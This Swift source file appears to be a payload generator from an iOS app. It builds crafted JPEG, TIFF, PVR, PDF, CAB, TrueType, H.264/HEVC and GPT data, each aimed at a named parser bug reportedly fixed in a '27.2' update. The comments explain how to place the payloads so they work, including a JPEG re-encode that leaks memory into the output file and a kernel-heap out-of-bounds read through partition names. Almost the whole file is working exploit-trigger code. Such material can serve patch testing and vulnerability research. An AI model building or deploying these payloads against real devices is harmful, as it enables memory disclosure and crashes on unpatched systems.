import Foundation
import UIKit
import ImageIO
import CoreGraphics
import CoreText
import AVFoundation

// MARK: - Additional payload builders for the remaining 27.2 fix families

extension JPEGPayload {

    /// Family E — an APP marker whose stored (offset, length) run past the block it lives in.
    ///
    /// On 27.0 `_APPx::writeToStream` copies `length` bytes from `base+offset` straight into
    /// the emitted JPEG with no bounds math, so the re-encode path writes whatever sits past
    /// the marker into the output file. 27.2 clamps with `end-offset` and logs
    /// "marker 0x%04X is out of bounds".
    /// A real, decodable JPEG carrying one APP2 marker whose declared length runs far past
    /// the bytes actually present.
    ///
    /// Placement matters and is not obvious: putting the marker right after SOI makes the
    /// declared length swallow the SOF/DHT/scan headers, and the source fails to decode at
    /// all. Placing it immediately *before* EOI is the construction that works — the image
    /// decodes, and the marker still lands in the parsed properties, so it survives into the
    /// re-encode path where `_APPx::writeToStream` runs.
    static func appxOverrun(declaredLength: Int = 0xFFF0, actual: Int = 12) -> Data {
        let base = [UInt8](solidJPEG())
        guard base.count > 4 else { return solidJPEG() }

        var marker: [UInt8] = [0xFF, 0xE2]
        marker += [UInt8((declaredLength >> 8) & 0xff), UInt8(declaredLength & 0xff)]
        marker += B.ascii("ICC_PROFILE\u{0}")
        marker += Array(repeating: 0x41, count: max(0, actual))

        // insert before the trailing EOI
        var out = Array(base.dropLast(2))
        out += marker
        out += [0xFF, 0xD9]
        return Data(out)
    }

    /// A small solid-colour JPEG produced by the system encoder.
    static func solidJPEG(size: Int = 32) -> Data {
        let colorSpace = CGColorSpaceCreateDeviceRGB()
        guard let ctx = CGContext(data: nil, width: size, height: size, bitsPerComponent: 8,
                                  bytesPerRow: size * 4, space: colorSpace,
                                  bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
            return Data(minimalSOI() + [0xFF, 0xD9])
        }
        ctx.setFillColor(CGColor(red: 0.2, green: 0.6, blue: 0.9, alpha: 1))
        ctx.fill(CGRect(x: 0, y: 0, width: size, height: size))
        guard let image = ctx.makeImage() else {
            return Data(minimalSOI() + [0xFF, 0xD9])
        }
        let data = NSMutableData()
        guard let dest = CGImageDestinationCreateWithData(data, "public.jpeg" as CFString, 1, nil) else {
            return Data(minimalSOI() + [0xFF, 0xD9])
        }
        CGImageDestinationAddImage(dest, image, nil)
        guard CGImageDestinationFinalize(dest) else {
            return Data(minimalSOI() + [0xFF, 0xD9])
        }
        return data as Data
    }
}

extension TIFFPayload {

    /// Family B — a directory entry whose element count makes `count << log2(elemsize)`
    /// wrap at 32 bits. The allocation shrinks to nothing while the conversion loop still
    /// writes `count` entries.
    static func dirEntryAllocWrap(count: UInt32 = 0x2000_0000, type: UInt16 = 6) -> Data {
        var out = Data()
        out.append(contentsOf: [0x49, 0x49, 0x2A, 0x00])
        out.append(contentsOf: B.le32(8))
        out.append(contentsOf: B.le16(3))
        // width / height keep the reader interested
        out.append(contentsOf: B.le16(256))
        out.append(contentsOf: B.le16(3))
        out.append(contentsOf: B.le32(1))
        out.append(contentsOf: B.le16(1) + B.le16(0))
        out.append(contentsOf: B.le16(257))
        out.append(contentsOf: B.le16(3))
        out.append(contentsOf: B.le32(1))
        out.append(contentsOf: B.le16(1) + B.le16(0))
        // the wrapped-count tag (SBYTE array, elemsize 1 — count alone is the multiplier)
        out.append(contentsOf: B.le16(0x0100))   // ImageWidth-class tag reused as the carrier
        out.append(contentsOf: B.le16(type))
        out.append(contentsOf: B.le32(count))
        out.append(contentsOf: B.le32(64))       // value offset
        out.append(contentsOf: B.le32(0))
        out.append(contentsOf: [UInt8](repeating: 0x00, count: 64))
        return out
    }

    /// Family K — PVR whose declared bits-per-pixel is smaller than the channel sum.
    static func pvrUnderBpp(width: UInt32 = 64, height: UInt32 = 64) -> Data {
        var out = Data()
        out.append(contentsOf: B.le32(0x0352_5650))       // 'PVR' v3
        out.append(contentsOf: B.le32(0))                 // flags
        out.append(contentsOf: B.le32(0x0000_0000))       // pixel format (PVRTC-ish)
        out.append(contentsOf: B.le32(0))                 // colour space
        out.append(contentsOf: B.le32(0))                 // channel type
        out.append(contentsOf: B.le32(height))
        out.append(contentsOf: B.le32(width))
        out.append(contentsOf: B.le32(1))                 // depth
        out.append(contentsOf: B.le32(1))                 // num surfaces
        out.append(contentsOf: B.le32(1))                 // num faces
        out.append(contentsOf: B.le32(1))                 // mip count
        out.append(contentsOf: B.le32(0))                 // meta data size
        // 4 channels of 8 bits declared, but bitsPerPixel below their sum
        out.append(contentsOf: B.le32(8) + B.le32(8) + B.le32(8) + B.le32(8))
        out.append(contentsOf: B.le32(8))                 // bitsPerPixel — too small
        out.append(contentsOf: B.le32(0) + B.le32(0) + B.le32(0) + B.le32(0))
        out.append(contentsOf: [UInt8](repeating: 0x33, count: 4096))
        return out
    }
}

extension PDFPayload {

    /// Family C — a page whose rasterized dimensions exceed the decode buffer the caller
    /// supplied. 27.0 rasterizes with no size validation and writes past the destination;
    /// 27.2 computes `width * bpp` and rejects with "decode buffer too small".
    static func rasterOverrun(width: Int = 4000, height: Int = 4000) -> Data {
        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 \(width) \(height)] /Resources << >> /Contents 4 0 R >>")
        let ops = "0 0 1 rg 0 0 \(width) \(height) re f"
        pdf.add(4, "<< /Length \(ops.utf8.count) >>", B.ascii(ops))
        return pdf.data()
    }
}

// MARK: - CAB (LZX match before initialised history)

enum CABPayload {

    /// Build a minimal Microsoft Cabinet with one folder and one CFDATA block whose LZX
    /// stream opens with a match before any window history exists.
    ///
    /// 27.0 computes `copy_pos = (w_pos - copy_pos) & w_mask` and copies straight out of an
    /// uninitialised window; 27.2 adds `copy_pos == 0 || copy_pos > w_filled → ARCHIVE_FAILED`.
    static func lzxEarlyMatch() -> Data {
        var out = Data()

        let cfdataPayload: [UInt8] = [
            // CFDATA header is written separately below; this is the LZX block itself.
            0x00, 0x00, 0x10,          // block header: verbatim, 0x0010 bytes
            0x1E,                      // main tree: single match-ish symbol stream
            0x00, 0x00,                // length footer
            0x00, 0x00, 0x00, 0x00,    // offset
        ]

        var cfdata = Data()
        cfdata.append(contentsOf: B.le32(0))                       // checksum (unchecked)
        cfdata.append(contentsOf: B.le16(UInt16(cfdataPayload.count)))
        cfdata.append(contentsOf: B.le16(0))                       // reserved
        cfdata.append(contentsOf: cfdataPayload)

        var file = Data()
        file.append(contentsOf: B.ascii("Cinder"))
        file.append(contentsOf: B.le32(0))                         // size
        file.append(contentsOf: B.le32(0))                         // offset in folder
        file.append(contentsOf: B.le16(0x20 | 0x01))               // attributes: archive
        file.append(contentsOf: [0x21, 0x26, 0x10, 0x5A])          // date/time
        file.append(contentsOf: [UInt8](repeating: 0x41, count: 8)) // name "AAAAAAAA"
        file.append(0)

        let headerSize = 36
        let folderSize = 8
        let fileSize = file.count
        let dataSize = cfdata.count
        let total = headerSize + folderSize + fileSize + dataSize

        out.append(contentsOf: B.ascii("MSCF"))
        out.append(contentsOf: B.le32(0))                          // reserved1
        out.append(contentsOf: B.le32(UInt32(total)))              // cabinet size
        out.append(contentsOf: B.le32(0))                          // reserved2
        out.append(contentsOf: B.le32(UInt32(headerSize)))         // file offset
        out.append(contentsOf: B.le32(0))                          // reserved3
        out.append(contentsOf: [3, 1])                             // version minor, major
        out.append(contentsOf: B.le16(1))                          // folder count
        out.append(contentsOf: B.le16(1))                          // file count
        out.append(contentsOf: B.le16(0))                          // flags
        out.append(contentsOf: B.le16(0x1234))                     // set id
        out.append(contentsOf: B.le16(0))                          // cabinet index

        // CFFOLDER
        out.append(contentsOf: B.le32(UInt32(headerSize + folderSize + fileSize)))  // data offset
        out.append(contentsOf: B.le16(1))                          // data block count
        out.append(contentsOf: B.le16(3))                          // compression type 3 = LZX
        out.append(contentsOf: [0x0F, 0x00])                       // window size (21 bits => 2MB)

        out.append(contentsOf: file)
        out.append(contentsOf: cfdata)
        return out
    }
}

// MARK: - CoreText GDEF attach list

enum FontPayload {

    /// A TrueType font whose GDEF LigCaretList chases a CaretValue offset far past the table.
    /// 27.0 follows the chain with no end-check; 27.2 clamps against the GDEF table slice.
    /// Layout: GDEF header 12 B, LigCaretList at 12, coverage at 24, LigGlyph at 28.
    static func gdefCaretChase() -> Data {
        var tables: [(String, [UInt8])] = []

        // head
        var head = [UInt8](repeating: 0, count: 54)
        head[0] = 0x00; head[1] = 0x01; head[2] = 0x00; head[3] = 0x00
        head[4] = 0x00; head[5] = 0x01; head[6] = 0x00; head[7] = 0x00
        head[12] = 0x5F; head[13] = 0x0F                 // magic
        tables.append(("head", head))

        // hhea
        var hhea = [UInt8](repeating: 0, count: 36)
        hhea[0] = 0x00; hhea[1] = 0x01
        hhea[34] = 0x00; hhea[35] = 0x00
        tables.append(("hhea", hhea))

        // maxp
        var maxp = [UInt8](repeating: 0, count: 32)
        maxp[0] = 0x00; maxp[1] = 0x00; maxp[2] = 0x50; maxp[3] = 0x00
        maxp[4] = 0x00; maxp[5] = 0x01
        tables.append(("maxp", maxp))

        // hmtx
        tables.append(("hmtx", [0x02, 0x00, 0x00, 0x00]))

        // loca (short format, 2 glyphs)
        tables.append(("loca", [0x00, 0x00, 0x00, 0x04]))

        // glyf
        tables.append(("glyf", [0x00, 0x00, 0x00, 0x00]))

        // cmap (format 4, minimal)
        var cmap = [UInt8]()
        cmap += B.be16(0) + B.be16(1)
        cmap += B.be16(3) + B.be16(1) + B.be32(12)
        cmap += B.be16(4) + B.be16(24) + B.be16(0)
        cmap += B.be16(2) + B.be16(2) + B.be16(0) + B.be16(0)
        cmap += B.be16(0xFFFF) + B.be16(0) + B.be16(0)
        tables.append(("cmap", cmap))

        // GDEF with a LigCaretList whose CaretValue offset runs past the table
        var gdef = [UInt8]()
        gdef += B.be16(0x0001) + B.be16(0x0000)      // version 1.0
        gdef += B.be16(0x0000)                       // glyphClassDefOffset — absent
        gdef += B.be16(0x0000)                       // attachListOffset — absent
        gdef += B.be16(0x000C)                       // ligCaretListOffset → 12
        gdef += B.be16(0x0000)                       // markAttachClassDefOffset — absent
        // LigCaretList at 12
        gdef += B.be16(0x000C)                       // coverageOffset → 24
        gdef += B.be16(0x0001)                       // ligGlyphCount
        gdef += B.be16(0x0010)                       // ligGlyphOffsets[0] → 28
        gdef += B.be16(0x0000)                       // pad
        // Coverage at 24: format 1, glyph 1
        gdef += B.be16(0x0001) + B.be16(0x0001) + B.be16(0x0001)
        // LigGlyph at 28
        gdef += B.be16(0x0001)                       // caretCount
        gdef += B.be16(0x7F00)                       // caretValueOffsets[0] — ~32 KB past the table
        tables.append(("GDEF", gdef))

        // --- assemble
        let numTables = UInt16(tables.count)
        var header = Data()
        header.append(contentsOf: B.be32(0x0001_0000))
        header.append(contentsOf: B.be16(numTables))
        var searchRange: UInt16 = 1
        var entrySelector: UInt16 = 0
        while searchRange * 2 <= numTables { searchRange *= 2; entrySelector += 1 }
        searchRange *= 16
        header.append(contentsOf: B.be16(searchRange))
        header.append(contentsOf: B.be16(entrySelector))
        header.append(contentsOf: B.be16(numTables * 16 - searchRange))

        var body = Data()
        var offset = 12 + Int(numTables) * 16
        var records = Data()
        var blobs = Data()
        for (tag, bytes) in tables.sorted(by: { $0.0 < $1.0 }) {
            records.append(contentsOf: B.ascii(tag))
            records.append(contentsOf: B.be32(0x0001_0000))   // checksum (unchecked by parsers)
            records.append(contentsOf: B.be32(UInt32(offset)))
            records.append(contentsOf: B.be32(UInt32(bytes.count)))
            var padded = bytes
            while padded.count % 4 != 0 { padded.append(0) }
            blobs.append(contentsOf: padded)
            offset += padded.count
        }
        body.append(records)
        body.append(blobs)

        var out = Data()
        out.append(header)
        out.append(body)
        return out
    }
}

// MARK: - H.264 / HEVC parameter-set probes

enum VideoPayload {

    /// An Annex-B H.264 access unit whose slice count far exceeds the decoder plugin's cap.
    /// 27.0's `AVD.videodecoder` accepts an unbounded slice count; 27.2 rejects with
    /// "too many slices!".
    static func avcManySlices(sliceCount: Int = 900, width: Int = 64, height: Int = 64) -> Data {
        var out = Data()
        out.append(contentsOf: [0, 0, 0, 1])
        // SPS
        var sps: [UInt8] = [0x67, 0x42, 0x00, 0x1E]
        // exp-golomb: seq_parameter_set_id=0, log2_max_frame_num=0, poc_type=0, ...
        sps += [0xE8, 0x38, 0x00]
        // fake but structurally plausible; the decoder's own error tells us how far it got
        sps += [UInt8](repeating: 0x00, count: 8)
        out.append(contentsOf: sps)
        out.append(contentsOf: [0, 0, 0, 1])
        out.append(contentsOf: [0x68, 0xCE, 0x38, 0x80])   // PPS
        for i in 0..<sliceCount {
            out.append(contentsOf: [0, 0, 0, 1])
            let header: [UInt8] = [0x65, UInt8(0x88 | (i & 0x03)), 0x84, 0x00]
            out.append(contentsOf: header)
            out.append(contentsOf: [UInt8](repeating: 0x00, count: 4))
        }
        return out
    }

    /// A multilayer HEVC stream whose layer id is outside the validated range.
    static func hevcBadLayerID(layerID: UInt8 = 0x3F) -> Data {
        var out = Data()
        out.append(contentsOf: [0, 0, 0, 1])
        // VPS NAL with a two-byte header carrying an out-of-range layer id
        out.append(contentsOf: [0x40, 0x01, layerID, 0x0C, 0x01, 0xFF, 0xFF, 0x01, 0x60])
        out.append(contentsOf: [0, 0, 0, 1])
        out.append(contentsOf: [0x42, 0x01, layerID, 0x01, 0x60, 0x00])
        out.append(contentsOf: [UInt8](repeating: 0x00, count: 16))
        return out
    }
}

// MARK: - GPT (IOStorageFamily partition-name scan)

enum GPTPayload {

    /// A protective-MBR + GPT whose partition-name field declares a 0x48-byte UTF-16 string
    /// while the entry only has room for 0x24. 27.0's name scan bound is 0x48 → 72-byte
    /// kernel-heap OOB read; 27.2 tightens it to 0x24.
    static func oversizedName(entryCount: Int = 4) -> Data {
        let sector = 512
        var out = Data()

        // protective MBR
        var mbr = [UInt8](repeating: 0, count: sector)
        mbr[446 + 4] = 0xEE
        mbr[446 + 5] = 0xFF; mbr[446 + 6] = 0xFF; mbr[446 + 7] = 0xFF
        mbr[446 + 8] = 0x01
        let totalSectors: UInt32 = 34
        mbr[446 + 12] = UInt8(totalSectors & 0xff)
        mbr[446 + 13] = UInt8((totalSectors >> 8) & 0xff)
        mbr[446 + 14] = UInt8((totalSectors >> 16) & 0xff)
        mbr[446 + 15] = UInt8((totalSectors >> 24) & 0xff)
        mbr[510] = 0x55; mbr[511] = 0xAA
        out.append(contentsOf: mbr)

        // primary GPT header
        var hdr = [UInt8](repeating: 0, count: sector)
        hdr[0] = 0x45; hdr[1] = 0x46; hdr[2] = 0x49; hdr[3] = 0x20
        hdr[4] = 0x50; hdr[5] = 0x41; hdr[6] = 0x52; hdr[7] = 0x54
        hdr[8] = 0x00; hdr[9] = 0x00; hdr[10] = 0x01; hdr[11] = 0x00
        let headerSize: UInt32 = 92
        hdr[12] = UInt8(headerSize & 0xff); hdr[13] = 0
        hdr[24] = 2                                    // my LBA
        hdr[32] = 33                                   // alternate LBA
        hdr[40] = 2                                    // first usable
        hdr[48] = 32                                   // last usable
        hdr[72] = 2                                    // entry array LBA
        let entries: UInt32 = UInt32(entryCount)
        hdr[80] = UInt8(entries & 0xff)
        hdr[84] = 128                                  // entry size
        out.append(contentsOf: hdr)

        // partition entries
        var array = Data()
        for i in 0..<entryCount {
            var entry = [UInt8](repeating: 0, count: 128)
            entry[0] = 0xA2; entry[1] = 0xA0; entry[2] = 0xD0; entry[3] = 0xEB
            entry[56] = UInt8(i + 1)                   // unique partition GUID byte
            // name field at +56..+128 is 36 UTF-16 code units; declare a long run
            let name = Array("CINDER27-OVERLONG-PARTITION-NAME".utf16)
            for (k, unit) in name.enumerated() where 56 + k * 2 + 1 < 128 {
                entry[56 + k * 2] = UInt8(unit & 0xff)
                entry[56 + k * 2 + 1] = UInt8((unit >> 8) & 0xff)
            }
            array.append(contentsOf: entry)
        }
        out.append(array)
        while out.count % sector != 0 { out.append(0) }
        return out
    }

    static func describe(_ image: Data) -> [String] {
        var lines: [String] = []
        guard image.count >= 1024 else { return [tl("镜像过短")] }
        let sig = [UInt8](image[512..<520])
        guard sig.starts(with: [0x45, 0x46, 0x49, 0x20, 0x50, 0x41, 0x52, 0x54]) else {
            return [tl("无 GPT 签名")]
        }
        let entryLBA = image.withUnsafeBytes { $0.load(fromByteOffset: 512 + 72, as: UInt64.self) }
        let entryCount = image.withUnsafeBytes { $0.load(fromByteOffset: 512 + 80, as: UInt32.self) }
        let entrySize = image.withUnsafeBytes { $0.load(fromByteOffset: 512 + 84, as: UInt32.self) }
        // every one of these is attacker-controlled in a hand-crafted image; the Int
        // conversions trap on huge values, and the multiply overflows. Bound them to
        // values that can only index inside the image we already hold.
        let safeLBA = entryLBA > 0 ? min(entryLBA, UInt64(image.count / 512)) : 0
        let safeCount = min(Int(entryCount), 4096)
        let safeSize = entrySize > 0 ? min(Int(entrySize), 512) : 128
        lines.append(tl("GPT 头: 条目表 LBA ") + "\(entryLBA)" + tl(" · ") + "\(entryCount)" + tl(" 项 · 每项 ") + "\(entrySize)" + tl(" B"))
        let base = Int(safeLBA) * 512
        for i in 0..<safeCount {
            let off = base + i * safeSize
            guard off + 128 <= image.count else { break }
            var units: [UInt16] = []
            for k in 0..<36 {
                let lo = UInt16(image[off + 56 + k * 2])
                let hi = UInt16(image[off + 56 + k * 2 + 1])
                let unit = lo | (hi << 8)
                if unit == 0 { break }
                units.append(unit)
            }
            let name = String(decoding: units, as: UTF16.self)
            if !name.isEmpty { lines.append(tl("  分区 ") + "\(i)" + tl(": ") + "\(name)") }
        }
        return lines
    }
}
